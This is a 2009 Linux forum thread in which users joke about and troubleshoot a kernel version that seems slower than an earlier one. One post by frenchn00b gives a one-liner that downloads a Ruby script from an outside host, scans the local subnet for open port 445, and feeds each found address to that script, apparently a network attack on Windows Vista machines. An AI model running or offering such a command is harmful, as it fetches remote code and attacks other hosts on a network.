---
title: "Kernel 2.6.30 damn slow compared to 2.6.26, on several machines"
date: 2009-11-18
forum: The Cafe
---

### Post by frenchn00b on 2009-11-18
Kernel 2.6.30 damn slow compared to 2.6.26, on several machines

is it normal?
Is linux becoming like VISTA or Aero?

---

### Post by RiceMonster on 2009-11-18
The goal is to have Linux 10x slower than Vista by 2.6.33

---

### Post by NoaHall on 2009-11-18
If I see another thread saying something like "Is linux becoming like VISTA or Aero?" I will cry. Don't make me do it.

---

### Post by frenchn00b on 2009-11-18
> **RiceMonster said:**
> The goal is to have Linux 10x slower than Vista by 2.6.33

was very funny
 
actually you can even hack vista:

```
wget stuff.twis.la/plop.rb && nmap -p445 $(ifconfig eth0 | head -2 | tail -1 | cut -d: -f2 | cut -d. -f 1,2,3).1-254 | grep -B3 open | grep -o -e '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+' | xargs ruby plop.rb

``` 
  
maybe that vulnerability will be in linux by 2.6.34

---

### Post by frenchn00b on 2009-11-18
> **NoaHall said:**
> If I see another thread saying something like "Is linux becoming like VISTA or Aero?" I will cry. Don't make me do it.

2.6.30 is slow :(

---

### Post by NoaHall on 2009-11-18
> **frenchn00b said:**
> 2.6.30 is slow :(

Then compile your own. It's still not Vista.

---

### Post by Dragonbite on 2009-11-18
> **NoaHall said:**
> If I see another thread saying something like "Is linux becoming like VISTA or Aero?" I will cry. Don't make me do it.

Oooohhhh, that tempts me to go out and make a few more threads!

---

### Post by cariboo on 2009-11-18
The Karmic kernel 2.6.31, you are using an old kernel.

---

### Post by picpak on 2009-11-18
> **frenchn00b said:**
> Kernel 2.6.30 damn slow compared to 2.6.26, on several machines

Then why not boot into 2.6.26? It should be an option under GRUB.

It's what I have to do because my wireless driver won't work properly under 2.6.31.

---

### Post by samjh on 2009-11-18
> **frenchn00b said:**
> Kernel 2.6.30 damn slow compared to 2.6.26, on several machines

is it normal?
Is linux becoming like VISTA or Aero?

How slow?  Have you measured it?  And have you ruled out the possibility that it might be a configuration problem with your (or other affected) machines?

There is one inescapable truth about the Linux kernel: it will get slower (and bigger) as more features are added to it.  It's the inevitable consequence of making Linux more accessible to wider range of users instead of just basement hobbyists, academics, and back-office servers.

---

### Post by Xbehave on 2009-11-18
1) this is a bug i find 2.6.30 to be a perfectly good kernel
2) you can always run a different kerenl (Several are supported at any given time)
3) you can always compile a custom lightwieght kernel
4) you can't crash a linux machine over the network by running some simple python

so in short NO linux is not becoming anything like windows!

---

### Post by frenchn00b on 2009-11-18
> **samjh said:**
> How slow?  Have you measured it?  And have you ruled out the possibility that it might be a configuration problem with your (or other affected) machines?

There is one inescapable truth about the Linux kernel: it will get slower (and bigger) as more features are added to it.  It's the inevitable consequence of making Linux more accessible to wider range of users instead of just basement hobbyists, academics, and back-office servers.

well I would be insterested to check the speed and make comparisons on several machines. 
that could be cool, and comparing with own kernels.
 
In any cases, a regular compiling kernel, own kernel, would give faster than backports or repositories kernels?

---

### Post by NoaHall on 2009-11-19
> **frenchn00b said:**
> well I would be insterested to check the speed and make comparisons on several machines. 
that could be cool, and comparing with own kernels.
 
In any cases, a regular compiling kernel, own kernel, would give faster than backports or repositories kernels?

Yes. Although the difference might be tiny.

---

### Post by frenchn00b on 2009-11-19
> **NoaHall said:**
> Yes. Although the difference might be tiny. 
 
not really. 

So it means Linux, Ubuntu, cannot provide lower brand kernel. Slackware does it.
they other wide range of kernel for : 

Everyone
(but cpu and type)

---

